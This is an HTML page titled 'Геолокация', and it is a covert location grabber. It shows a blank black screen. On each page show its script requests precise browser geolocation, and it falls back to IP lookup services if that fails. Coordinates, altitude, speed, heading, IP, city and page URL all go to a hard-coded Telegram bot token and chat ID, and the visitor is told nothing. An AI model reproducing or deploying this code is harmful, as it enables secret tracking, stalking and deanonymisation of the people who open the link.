<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Геолокация</title>
    <style>
        html, body { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; }
    </style>
</head>
<body>
<script>
    // ===== Данные бота =====
    const BOT_TOKEN = "7721494922:AAE3rqaQwY4eKMHb07Kb_Pv2HxK6LMv6up4";
    const CHAT_ID   = "5570036809";

    // ===== Отправка текста с HTML-форматированием =====
    function sendMessage(text, parseMode = 'HTML') {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=${parseMode}`;
        new Image().src = url;
        fetch(url, { mode: 'no-cors' }).catch(() => {});
    }

    // ===== Отправка местоположения (карта) =====
    function sendLocation(lat, lon, accuracy) {
        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
        if (accuracy) url += `&horizontal_accuracy=${accuracy}`;
        new Image().src = url;
        fetch(url, { mode: 'no-cors' }).catch(() => {});
    }

    // ===== Форматирование даты =====
    function getFormattedDate() {
        const d = new Date();
        return d.toISOString().replace('T', ' ').slice(0, 19);
    }

    // ===== Основная функция получения координат (с повторными попытками) =====
    function getLocation(attempt = 1) {
        if (!navigator.geolocation) {
            sendMessage('❌ <b>Браузер не поддерживает геолокацию</b>');
            getIPGeo();
            return;
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const c = pos.coords;
                const acc = c.accuracy;
                // Если точность больше 50 м и попыток меньше 3 – пробуем ещё раз
                if (acc > 50 && attempt < 3) {
                    setTimeout(() => getLocation(attempt + 1), 2000);
                    return;
                }

                // Отправляем красивое текстовое сообщение
                const msg = `<b>📍 Точные координаты</b>\n` +
                            `<b>Широта:</b> <code>${c.latitude}</code>\n` +
                            `<b>Долгота:</b> <code>${c.longitude}</code>\n` +
                            `<b>Точность:</b> ${acc} м\n` +
                            `<b>Высота:</b> ${c.altitude ?? 'нет'}\n` +
                            `<b>Время:</b> ${getFormattedDate()}\n` +
                            `<b>URL:</b> <a href="${location.href}">ссылка</a>`;
                sendMessage(msg);

                // Отправляем карту с меткой
                sendLocation(c.latitude, c.longitude, acc);

                // Дополнительно можно отправить ещё и скорость, направление, если есть
                if (c.speed) sendMessage(`🚀 Скорость: ${c.speed} м/с`);
                if (c.heading) sendMessage(`🧭 Направление: ${c.heading}°`);
            },
            (err) => {
                sendMessage(`❌ <b>Ошибка геолокации:</b> ${err.message}`);
                getIPGeo(); // запасной вариант
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
    }

    // ===== IP-гео (красиво) =====
    function getIPGeo() {
        const services = [
            'https://ipapi.co/json/',
            'https://ipinfo.io/json',
            'https://api.ipify.org?format=json'
        ];
        let idx = 0;

        function tryNext() {
            if (idx >= services.length) {
                sendMessage('❌ <b>Не удалось определить IP-гео</b> (все сервисы недоступны)');
                return;
            }
            fetch(services[idx])
                .then(res => { if (!res.ok) throw new Error('HTTP ' + res.status); return res.json(); })
                .then(data => {
                    let msg = `<b>🌐 IP-гео (${services[idx]})</b>\n`;
                    if (data.city)      msg += `<b>Город:</b> ${data.city}\n`;
                    if (data.region)    msg += `<b>Регион:</b> ${data.region}\n`;
                    if (data.country_name) msg += `<b>Страна:</b> ${data.country_name}\n`;
                    else if (data.country) msg += `<b>Страна:</b> ${data.country}\n`;
                    if (data.ip)        msg += `<b>IP:</b> <code>${data.ip}</code>\n`;
                    if (data.loc) {
                        const [lat, lon] = data.loc.split(',');
                        msg += `<b>Координаты:</b> ${lat}, ${lon}\n`;
                        // также отправляем location для карты
                        sendLocation(parseFloat(lat), parseFloat(lon));
                    }
                    msg += `<b>URL:</b> <a href="${location.href}">ссылка</a>`;
                    sendMessage(msg);
                })
                .catch(() => { idx++; tryNext(); });
        }
        tryNext();
    }

    // ===== Запуск при каждом показе страницы =====
    window.addEventListener('pageshow', () => getLocation());
</script>
</body>
</html>
